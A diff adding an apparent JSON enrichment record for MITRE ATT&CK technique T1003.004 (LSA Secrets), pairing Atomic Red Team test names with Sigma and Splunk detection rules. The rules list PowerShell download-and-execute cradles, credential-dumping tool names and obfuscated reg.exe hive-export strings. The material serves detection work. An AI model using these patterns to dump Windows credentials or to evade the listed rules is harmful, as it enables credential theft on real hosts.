@@ -1,0 +1,296 @@
+{
+    "id": "T1003.004",
+    "name": "LSA Secrets",
+    "description": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at `HKEY_LOCAL_MACHINESECURITYPolicySecrets`. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)\n[Reg](S0075) can be used to extract from the Registry. [Mimikatz](S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)",
+    "platforms": "Windows",
+    "kill_chain_phases": "Credential Access",
+    "data_sources": "Windows Registry: Windows Registry Key Access, Command: Command Execution",
+    "detection": "Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.",
+    "url": "https://attack.mitre.org/techniques/T1003/004",
+    "enrichments": {
+        "attack_rule_map": [
+            {
+                "tech_id": "T1003.004",
+                "atomic_attack_guid": "2dfa3bff-9a27-46db-ab75-7faefdaca732",
+                "atomic_attack_name": "Dump Kerberos Tickets from LSA using dumper.ps1",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "PowerShell Download and Execution Cradles",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_iex.yml",
+                        "remote_content": "title: PowerShell Download and Execution Cradles\nid: 85b0b087-eddf-4a2b-b033-d771fa2b9775\nstatus: test\ndescription: Detects PowerShell download and execution cradles.\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\n    - https://labs.withsecure.com/publications/fin7-target-veeam-servers\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-05-04\ntags:\n    - attack.execution\n    - attack.t1059\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection_download:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    selection_iex:\n        CommandLine|contains:\n            - ';iex $'\n            - '| IEX'\n            - '|IEX '\n            - 'I`E`X'\n            - 'I`EX'\n            - 'IE`X'\n            - 'iex '\n            - 'IEX ('\n            - 'IEX('\n            - 'Invoke-Expression'\n    condition: all of selection_*\nfalsepositives:\n    - Some PowerShell installers were seen using similar combinations. Apply filters accordingly\nlevel: high\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Download Pattern",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_patterns.yml",
+                        "remote_content": "title: PowerShell Download Pattern\nid: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7\nrelated:\n    - id: e6c54d94-498c-4562-a37c-b469d8e9a275\n      type: derived\nstatus: test\ndescription: Detects a Powershell process that contains download commands in its command line string\nreferences:\n    - https://blog.redteam.pl/2020/06/black-kingdom-ransomware.html\n    - https://lab52.io/blog/winter-vivern-all-summer/\n    - https://hatching.io/blog/powershell-analysis/\nauthor: Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro\ndate: 2019-01-16\nmodified: 2023-01-26\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection_img:\n        - Image|endswith:\n              - '\\powershell.exe'\n              - '\\pwsh.exe'\n        - OriginalFileName:\n              - 'PowerShell.EXE'\n              - 'pwsh.dll'\n    selection_cli:\n        CommandLine|contains|all:\n            - 'new-object'\n            - 'net.webclient).'\n            - 'download'\n        CommandLine|contains:\n            - 'string('\n            - 'file('\n    condition: all of selection_*\nfalsepositives:\n    - Unknown\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Usage Of Web Request Commands And Cmdlets",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_web_request_cmd_and_cmdlets.yml",
+                        "remote_content": "title: Usage Of Web Request Commands And Cmdlets\nid: 9fc51a3c-81b3-4fa7-b35f-7c02cf10fd2d\nrelated:\n    - id: 1139d2e2-84b1-4226-b445-354492eba8ba\n      type: similar\n    - id: f67dbfce-93bc-440d-86ad-a95ae8858c90\n      type: obsolete\n    - id: cd5c8085-4070-4e22-908d-a5b3342deb74\n      type: obsolete\nstatus: test\ndescription: Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via CommandLine\nreferences:\n    - https://4sysops.com/archives/use-powershell-to-download-a-file-with-http-https-and-ftp/\n    - https://blog.jourdant.me/post/3-ways-to-download-files-with-powershell\n    - https://learn.microsoft.com/en-us/powershell/module/bitstransfer/add-bitsfile?view=windowsserver2019-ps\nauthor: James Pemberton / @4A616D6573, Endgame, JHasenbusch, oscd.community, Austin Songer @austinsonger\ndate: 2019-10-24\nmodified: 2023-01-10\ntags:\n    - attack.execution\n    - attack.t1059.001\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '[System.Net.WebRequest]::create'\n            - 'curl '\n            - 'Invoke-RestMethod'\n            - 'Invoke-WebRequest'\n            - 'iwr '\n            - 'Net.WebClient'\n            - 'Resume-BitsTransfer'\n            - 'Start-BitsTransfer'\n            - 'wget '\n            - 'WinHttp.WinHttpRequest'\n    condition: selection\nfalsepositives:\n    - Use of Get-Command and Get-Help modules to reference Invoke-WebRequest and Start-BitsTransfer.\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "PowerShell Web Download",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_powershell_download_cradles.yml",
+                        "remote_content": "title: PowerShell Web Download\nid: 6e897651-f157-4d8f-aaeb-df8151488385\nstatus: test\ndescription: Detects suspicious ways to download files or content using PowerShell\nreferences:\n    - https://github.com/VirtualAlllocEx/Payload-Download-Cradles/blob/88e8eca34464a547c90d9140d70e9866dcbc6a12/Download-Cradles.cmd\nauthor: Florian Roth (Nextron Systems)\ndate: 2022-03-24\nmodified: 2023-01-05\ntags:\n    - attack.command-and-control\n    - attack.execution\n    - attack.t1059.001\n    - attack.t1105\nlogsource:\n    product: windows\n    category: process_creation\ndetection:\n    selection:\n        CommandLine|contains:\n            - '.DownloadString('\n            - '.DownloadFile('\n            - 'Invoke-WebRequest '\n            - 'iwr '\n    condition: selection\nfalsepositives:\n    - Scripts or tools that download files\nlevel: medium\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Any Powershell DownloadString",
+                        "rule_link": "https://research.splunk.com/endpoint/4d015ef2-7adf-11eb-95da-acde48001122/"
+                    }
+                ]
+            },
+            {
+                "tech_id": "T1003.004",
+                "atomic_attack_guid": "55295ab0-a703-433b-9ca4-ae13807de12f",
+                "atomic_attack_name": "Dumping LSA Secrets",
+                "platform": "Windows",
+                "sigma_rules": [
+                    {
+                        "rule_name": "Use Short Name Path in Command Line",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_ntfs_short_name_path_use_cli.yml",
+                        "remote_content": "title: Use Short Name Path in Command Line\nid: 349d891d-fef0-4fe4-bc53-eee623a15969\nrelated:\n    - id: a96970af-f126-420d-90e1-d37bf25e50e1\n      type: similar\nstatus: test\ndescription: Detect use of the Windows 8.3 short name. Which could be used as a method to avoid command-line detection\nreferences:\n    - https://www.acunetix.com/blog/articles/windows-short-8-3-filenames-web-security-problem/\n    - https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-2000-server/cc959352(v=technet.10)\n    - https://twitter.com/frack113/status/1555830623633375232\nauthor: frack113, Nasreddine Bencherchali\ndate: 2022-08-07\nmodified: 2022-10-26\ntags:\n    - attack.defense-evasion\n    - attack.t1564.004\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains:\n            - '~1\\'\n            - '~2\\'\n    filter:\n        - ParentImage:\n              - 'C:\\Windows\\System32\\Dism.exe'\n              - 'C:\\Windows\\System32\\cleanmgr.exe'\n              - 'C:\\Program Files\\GPSoftware\\Directory Opus\\dopus.exe'\n        - ParentImage|endswith:\n              - '\\WebEx\\WebexHost.exe'\n              - '\\thor\\thor64.exe'\n              - '\\veam.backup.shell.exe'\n              - '\\winget.exe'\n              - '\\Everything\\Everything.exe'\n        - ParentImage|contains: '\\AppData\\Local\\Temp\\WinGet\\'\n        - CommandLine|contains:\n              - '\\appdata\\local\\webex\\webex64\\meetings\\wbxreport.exe'\n              - 'C:\\Program Files\\Git\\post-install.bat'\n              - 'C:\\Program Files\\Git\\cmd\\scalar.exe'\n    condition: selection and not filter\nfalsepositives:\n    - Applications could use this notation occasionally which might generate some false positives. In that case investigate the parent and child process.\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Psexec Execution",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_psexec_execution.yml",
+                        "remote_content": "title: Psexec Execution\nid: 730fc21b-eaff-474b-ad23-90fd265d4988\nstatus: test\ndescription: Detects user accept agreement execution in psexec commandline\nreferences:\n    - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html\nauthor: omkar72\ndate: 2020-10-30\nmodified: 2023-02-28\ntags:\n    - attack.execution\n    - attack.t1569\n    - attack.t1021\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        - Image|endswith: '\\psexec.exe'\n        - OriginalFileName: 'psexec.c'\n    condition: selection\nfalsepositives:\n    - Administrative scripts.\nlevel: medium\n"
+                    },
+                    {
+                        "rule_name": "Potential Execution of Sysinternals Tools",
+                        "rule_link": "https://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_sysinternals_eula_accepted.yml",
+                        "remote_content": "title: Potential Execution of Sysinternals Tools\nid: 7cccd811-7ae9-4ebe-9afd-cb5c406b824b\nrelated:\n    - id: 25ffa65d-76d8-4da5-a832-3f2b0136e133\n      type: derived\nstatus: test\ndescription: Detects command lines that contain the 'accepteula' flag which could be a sign of execution of one of the Sysinternals tools\nreferences:\n    - https://twitter.com/Moti_B/status/1008587936735035392\nauthor: Markus Neis\ndate: 2017-08-28\nmodified: 2024-03-13\ntags:\n    - attack.resource-development\n    - attack.t1588.002\nlogsource:\n    category: process_creation\n    product: windows\ndetection:\n    selection:\n        CommandLine|contains|windash: ' -accepteula'\n    condition: selection\nfalsepositives:\n    - Legitimate use of SysInternals tools\n    - Programs that use the same command line flag\nlevel: low\n"
+                    }
+                ],
+                "splunk_rules": [
+                    {
+                        "rule_name": "Attempted Credential Dump From Registry via Reg exe",
+                        "rule_link": "https://research.splunk.com/endpoint/e9fb4a59-c5fb-440a-9f24-191fbc6b2911/"
+                    },
+                    {
+                        "rule_name": "Detect PsExec With accepteula Flag",
+                        "rule_link": "https://research.splunk.com/endpoint/27c3a83d-cada-47c6-9042-67baf19d2574/"
+                    }
+                ]
+            }
+        ],
+        "cycat": {
+            "cycat": {
+                "cycat_related_uuids": [
+                    "df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2",
+                    "39a94fd1-8c9a-4ff6-bf22-c058762f8014",
+                    "961d0ba2-3eea-4303-a930-2cf78bbfcc5e",
+                    "252902e3-5830-4cf6-bf21-c22083dfd5cf",
+                    "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
+                    "1ecfdab8-7d59-4c98-95d4-dc41970f57fc",
+                    "f0d1feba-4344-4ca9-8121-a6c97bd6df52",
+                    "4ac1f50b-3bd0-4968-902d-868b4647937e",
+                    "92dae1ed-1c9d-4eff-a567-33acbd95b00e",
+                    "fd877b94-9bb5-4191-bb25-d79cbd93c167",
+                    "4976aa50-8f41-45c6-8b15-ab3fc10e79ed",
+                    "8fbf3271-1ef6-4e94-8210-03c2317947f6",
+                    "a642964e-bead-4bed-8910-1bb4d63e3b4d",
+                    "06d71506-7beb-4f22-8888-e2e5e2ca7fd8"
+                ],
+                "lookup_results": [
+                    {
+                        "uuid": "df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2",
+                        "lookup_data": {
+                            "description": "Detects well-known credential dumping tools execution via service execution events",
+                            "raw": "author: Florian Roth (Nextron Systems), Teymur Kheirkhabarov, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2017/03/05\ndescription: Detects well-known credential dumping tools execution via service execution\n  events\ndetection:\n  condition: selection\n  selection:\n    ImageLoaded|contains:\n    - fgexec\n    - dumpsvc\n    - cachedump\n    - mimidrv\n    - gsecdump\n    - servpw\n    - pwdump\nfalsepositives:\n- Legitimate Administrator using credential dumping tool for password recovery\nid: df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2\nlevel: critical\nlogsource:\n  category: driver_load\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nrelated:\n- id: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed\n  type: derived\nstatus: test\ntags:\n- attack.credential_access\n- attack.execution\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\n- attack.t1569.002\n- attack.s0005\ntitle: Credential Dumping Tools Service Execution\n",
+                            "sigma:id": "df5ff0a5-f83f-4a5b-bba1-3e6a3f6f6ea2",
+                            "title": "Credential Dumping Tools Service Execution",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "39a94fd1-8c9a-4ff6-bf22-c058762f8014",
+                        "lookup_data": {
+                            "description": "Detects anyone attempting a backup for the DPAPI Master Key. This events gets generated at the source and not the Domain Controller.",
+                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019/08/10\ndescription: Detects anyone attempting a backup for the DPAPI Master Key. This events\n  gets generated at the source and not the Domain Controller.\ndetection:\n  condition: selection\n  selection:\n    EventID: 4692\nfalsepositives:\n- Unknown\nfields:\n- ComputerName\n- SubjectDomainName\n- SubjectUserName\nid: 39a94fd1-8c9a-4ff6-bf22-c058762f8014\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2021/11/27\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-190620024610.html\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.004\ntitle: DPAPI Domain Master Key Backup Attempt\n",
+                            "sigma:id": "39a94fd1-8c9a-4ff6-bf22-c058762f8014",
+                            "title": "DPAPI Domain Master Key Backup Attempt",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "961d0ba2-3eea-4303-a930-2cf78bbfcc5e",
+                        "lookup_data": {
+                            "description": "Detects well-known credential dumping tools execution via specific named pipes",
+                            "raw": "author: Teymur Kheirkhabarov, oscd.community\ndate: 2019/11/01\ndescription: Detects well-known credential dumping tools execution via specific named\n  pipes\ndetection:\n  condition: selection\n  selection:\n    PipeName|contains:\n    - \\lsadump\n    - \\cachedump\n    - \\wceservicepipe\nfalsepositives:\n- Legitimate Administrator using tool for password recovery\nid: 961d0ba2-3eea-4303-a930-2cf78bbfcc5e\nlevel: critical\nlogsource:\n  category: pipe_created\n  definition: Note that you have to configure logging for Named Pipe Events in Sysmon\n    config (Event ID 17 and Event ID 18). The basic configuration is in popular sysmon\n    configuration (https://github.com/SwiftOnSecurity/sysmon-config), but it is worth\n    verifying. You can also use other repo, e.g. https://github.com/Neo23x0/sysmon-config,\n    https://github.com/olafhartong/sysmon-modular. How to test detection? You can\n    check powershell script from this site https://svch0st.medium.com/guide-to-named-pipes-and-hunting-for-cobalt-strike-pipes-dc46b2c5f575\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\ntitle: Cred Dump-Tools Named Pipes\n",
+                            "sigma:id": "961d0ba2-3eea-4303-a930-2cf78bbfcc5e",
+                            "title": "Cred Dump-Tools Named Pipes",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "252902e3-5830-4cf6-bf21-c22083dfd5cf",
+                        "lookup_data": {
+                            "description": "Detect AD credential dumping using impacket secretdump HKTL",
+                            "raw": "author: Samir Bousseaden, wagga\ndate: 2019/04/03\ndescription: Detect AD credential dumping using impacket secretdump HKTL\ndetection:\n  condition: selection\n  selection:\n    EventID: 5145\n    RelativeTargetName|contains|all:\n    - SYSTEM32\\\n    - .tmp\n    ShareName: \\\\\\\\\\*\\\\ADMIN$\nfalsepositives:\n- Unknown\nid: 252902e3-5830-4cf6-bf21-c22083dfd5cf\nlevel: high\nlogsource:\n  definition: The advanced audit policy setting \"Object Access > Audit Detailed File\n    Share\" must be configured for Success/Failure\n  product: windows\n  service: security\nmodified: 2022/08/11\nreferences:\n- https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.003\ntitle: Possible Impacket SecretDump Remote Activity\n",
+                            "sigma:id": "252902e3-5830-4cf6-bf21-c22083dfd5cf",
+                            "title": "Possible Impacket SecretDump Remote Activity",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
+                        "lookup_data": {
+                            "description": "UNC3524: Eye Spy on Your Email",
+                            "link": "http://www.botvrij.eu/data/feed-osint/25adc94b-5b29-44fe-a4a8-c89d17ff3566.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1652459344",
+                            "uuid": "25adc94b-5b29-44fe-a4a8-c89d17ff3566",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "1ecfdab8-7d59-4c98-95d4-dc41970f57fc",
+                        "lookup_data": {
+                            "mitre-attack-id": "T1003.004",
+                            "mitre-cti:description": "Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\SECURITY\\Policy\\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)\n\n[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)",
+                            "mitre-cti:name": "LSA Secrets",
+                            "mitre-cti:type": "attack-pattern",
+                            "raw": "{'x_mitre_platforms': ['Windows'], 'x_mitre_domains': ['enterprise-attack'], 'x_mitre_contributors': ['Ed Williams, Trustwave, SpiderLabs'], 'object_marking_refs': ['marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168'], 'id': 'attack-pattern--1ecfdab8-7d59-4c98-95d4-dc41970f57fc', 'type': 'attack-pattern', 'created': '2020-02-21T16:22:09.493Z', 'created_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'external_references': [{'source_name': 'mitre-attack', 'external_id': 'T1003.004', 'url': 'https://attack.mitre.org/techniques/T1003/004'}, {'source_name': 'Passcape LSA Secrets', 'url': 'https://www.passcape.com/index.php?section=docsys&cmd=details&id=23', 'description': 'Passcape. (n.d.). Windows LSA secrets. Retrieved February 21, 2020.'}, {'source_name': 'Microsoft AD Admin Tier Model', 'url': 'https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material?redirectedfrom=MSDN', 'description': 'Microsoft. (2019, February 14). Active Directory administrative tier model. Retrieved February 21, 2020.'}, {'source_name': 'Tilbury Windows Credentials', 'url': 'https://www.first.org/resources/papers/conf2017/Windows-Credentials-Attacks-and-Mitigation-Techniques.pdf', 'description': 'Chad Tilbury. (2017, August 8). 1Windows Credentials: Attack, Mitigation, Defense. Retrieved February 21, 2020.'}, {'source_name': 'ired Dumping LSA Secrets', 'url': 'https://ired.team/offensive-security/credential-access-and-credential-dumping/dumping-lsa-secrets', 'description': 'Mantvydas Baranauskas. (2019, November 16). Dumping LSA Secrets. Retrieved February 21, 2020.'}, {'url': 'https://github.com/mattifestation/PowerSploit', 'description': 'PowerSploit. (n.d.). Retrieved December 4, 2014.', 'source_name': 'Powersploit'}], 'modified': '2021-04-21T21:12:38.361Z', 'name': 'LSA Secrets', 'description': 'Adversaries with SYSTEM access to a host may attempt to access Local Security Authority (LSA) secrets, which can contain a variety of different credential materials, such as credentials for service accounts.(Citation: Passcape LSA Secrets)(Citation: Microsoft AD Admin Tier Model)(Citation: Tilbury Windows Credentials) LSA secrets are stored in the registry at <code>HKEY_LOCAL_MACHINE\\\\SECURITY\\\\Policy\\\\Secrets</code>. LSA secrets can also be dumped from memory.(Citation: ired Dumping LSA Secrets)\\n\\n[Reg](https://attack.mitre.org/software/S0075) can be used to extract from the Registry. [Mimikatz](https://attack.mitre.org/software/S0002) can be used to extract secrets from memory.(Citation: ired Dumping LSA Secrets)', 'kill_chain_phases': [{'kill_chain_name': 'mitre-attack', 'phase_name': 'credential-access'}], 'x_mitre_detection': \"Monitor processes and command-line arguments for program execution that may be indicative of credential dumping. Remote access tools may contain built-in features or incorporate existing tools like Mimikatz. PowerShell scripts also exist that contain credential dumping functionality, such as PowerSploit's Invoke-Mimikatz module,(Citation: Powersploit) which may require additional logging features to be configured in the operating system to collect necessary information for analysis.\", 'x_mitre_is_subtechnique': True, 'x_mitre_version': '1.0', 'x_mitre_modified_by_ref': 'identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5', 'x_mitre_data_sources': ['Command: Command Execution', 'Windows Registry: Windows Registry Key Access'], 'x_mitre_permissions_required': ['SYSTEM']}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "f0d1feba-4344-4ca9-8121-a6c97bd6df52",
+                        "lookup_data": {
+                            "description": "Detects well-known credential dumping tools execution via service execution events",
+                            "raw": "author: Florian Roth (Nextron Systems), Teymur Kheirkhabarov, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2017/03/05\ndescription: Detects well-known credential dumping tools execution via service execution\n  events\ndetection:\n  condition: selection\n  selection:\n    EventID: 4697\n    ServiceFileName|contains:\n    - fgexec\n    - dumpsvc\n    - cachedump\n    - mimidrv\n    - gsecdump\n    - servpw\n    - pwdump\nfalsepositives:\n- Legitimate Administrator using credential dumping tool for password recovery\nid: f0d1feba-4344-4ca9-8121-a6c97bd6df52\nlevel: high\nlogsource:\n  definition: The 'System Security Extension' audit subcategory need to be enabled\n    to log the EID 4697\n  product: windows\n  service: security\nmodified: 2022/11/29\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nrelated:\n- id: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed\n  type: derived\nstatus: test\ntags:\n- attack.credential_access\n- attack.execution\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\n- attack.t1569.002\n- attack.s0005\ntitle: Credential Dumping Tools Service Execution - Security\n",
+                            "sigma:id": "f0d1feba-4344-4ca9-8121-a6c97bd6df52",
+                            "title": "Credential Dumping Tools Service Execution - Security",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4ac1f50b-3bd0-4968-902d-868b4647937e",
+                        "lookup_data": {
+                            "description": "Detects tools extracting LSA secret DPAPI domain backup key from Domain Controllers",
+                            "raw": "author: Roberto Rodriguez @Cyb3rWard0g\ndate: 2019/06/20\ndescription: Detects tools extracting LSA secret DPAPI domain backup key from Domain\n  Controllers\ndetection:\n  condition: selection\n  selection:\n    AccessMask: '0x2'\n    EventID: 4662\n    ObjectName|contains: BCKUPKEY\n    ObjectType: SecretObject\nfalsepositives:\n- Unknown\nid: 4ac1f50b-3bd0-4968-902d-868b4647937e\nlevel: high\nlogsource:\n  product: windows\n  service: security\nmodified: 2022/02/24\nreferences:\n- https://threathunterplaybook.com/notebooks/windows/06_credential_access/WIN-190620024610.html\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.004\ntitle: DPAPI Domain Backup Key Extraction\n",
+                            "sigma:id": "4ac1f50b-3bd0-4968-902d-868b4647937e",
+                            "title": "DPAPI Domain Backup Key Extraction",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "92dae1ed-1c9d-4eff-a567-33acbd95b00e",
+                        "lookup_data": {
+                            "description": "Detect AD credential dumping using impacket secretdump HKTL. Based on the SIGMA rules/windows/builtin/win_impacket_secretdump.yml",
+                            "raw": "author: Samir Bousseaden, @neu5ron\ndate: 2020/03/19\ndescription: Detect AD credential dumping using impacket secretdump HKTL. Based on\n  the SIGMA rules/windows/builtin/win_impacket_secretdump.yml\ndetection:\n  condition: selection\n  selection:\n    name|contains: SYSTEM32\\\n    name|endswith: .tmp\n    path|contains|all:\n    - \\\n    - ADMIN$\nfalsepositives:\n- Unknown\nid: 92dae1ed-1c9d-4eff-a567-33acbd95b00e\nlevel: high\nlogsource:\n  product: zeek\n  service: smb_files\nmodified: 2021/11/27\nreferences:\n- https://blog.menasec.net/2019/02/threat-huting-10-impacketsecretdump.html\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.003\ntitle: Possible Impacket SecretDump Remote Activity - Zeek\n",
+                            "sigma:id": "92dae1ed-1c9d-4eff-a567-33acbd95b00e",
+                            "title": "Possible Impacket SecretDump Remote Activity - Zeek",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "fd877b94-9bb5-4191-bb25-d79cbd93c167",
+                        "lookup_data": {
+                            "description": "Dump sam, system or security hives using REG.exe utility",
+                            "raw": "author: Teymur Kheirkhabarov, Endgame, JHasenbusch, Daniil Yugoslavskiy, oscd.community\ndate: 2019/10/22\ndescription: Dump sam, system or security hives using REG.exe utility\ndetection:\n  condition: all of selection_*\n  selection_1:\n    CommandLine|contains:\n    - save\n    - export\n    - \"\\u02E2ave\"\n    - \"e\\u02E3port\"\n    Image|endswith: \\reg.exe\n  selection_2:\n    CommandLine|contains:\n    - hklm\n    - \"hk\\u02EAm\"\n    - hkey_local_machine\n    - \"hkey_\\u02EAocal_machine\"\n    - \"hkey_loca\\u02EA_machine\"\n    - \"hkey_\\u02EAoca\\u02EA_machine\"\n  selection_3:\n    CommandLine|endswith:\n    - \\system\n    - \\sam\n    - \\security\n    - \"\\\\\\u02E2ystem\"\n    - \"\\\\sy\\u02E2tem\"\n    - \"\\\\\\u02E2y\\u02E2tem\"\n    - \"\\\\\\u02E2am\"\n    - \"\\\\\\u02E2ecurity\"\nfalsepositives:\n- Dumping hives for legitimate purpouse i.e. backup or forensic investigation\nid: fd877b94-9bb5-4191-bb25-d79cbd93c167\nlevel: medium\nlogsource:\n  category: process_creation\n  product: windows\nmodified: 2021/11/27\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\n- https://eqllib.readthedocs.io/en/latest/analytics/aed95fc6-5e3f-49dc-8b35-06508613f979.html\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1003/T1003.md\n- https://www.wietzebeukema.nl/blog/windows-command-line-obfuscation\nstatus: test\ntags:\n- attack.credential_access\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- car.2013-07-001\ntitle: Grabbing Sensitive Hives via Reg Utility\n",
+                            "sigma:id": "fd877b94-9bb5-4191-bb25-d79cbd93c167",
+                            "title": "Grabbing Sensitive Hives via Reg Utility",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "4976aa50-8f41-45c6-8b15-ab3fc10e79ed",
+                        "lookup_data": {
+                            "description": "Detects well-known credential dumping tools execution via service execution events",
+                            "raw": "author: Florian Roth (Nextron Systems), Teymur Kheirkhabarov, Daniil Yugoslavskiy,\n  oscd.community\ndate: 2017/03/05\ndescription: Detects well-known credential dumping tools execution via service execution\n  events\ndetection:\n  condition: selection\n  selection:\n    EventID: 7045\n    ImagePath|contains:\n    - fgexec\n    - dumpsvc\n    - cachedump\n    - mimidrv\n    - gsecdump\n    - servpw\n    - pwdump\n    Provider_Name: Service Control Manager\nfalsepositives:\n- Legitimate Administrator using credential dumping tool for password recovery\nid: 4976aa50-8f41-45c6-8b15-ab3fc10e79ed\nlevel: high\nlogsource:\n  product: windows\n  service: system\nmodified: 2022/11/29\nreferences:\n- https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment\nstatus: experimental\ntags:\n- attack.credential_access\n- attack.execution\n- attack.t1003.001\n- attack.t1003.002\n- attack.t1003.004\n- attack.t1003.005\n- attack.t1003.006\n- attack.t1569.002\n- attack.s0005\ntitle: Credential Dumping Tools Service Execution - System\n",
+                            "sigma:id": "4976aa50-8f41-45c6-8b15-ab3fc10e79ed",
+                            "title": "Credential Dumping Tools Service Execution - System",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "8fbf3271-1ef6-4e94-8210-03c2317947f6",
+                        "lookup_data": {
+                            "description": "Files with well-known filenames (parts of credential dump software or files produced by them) creation",
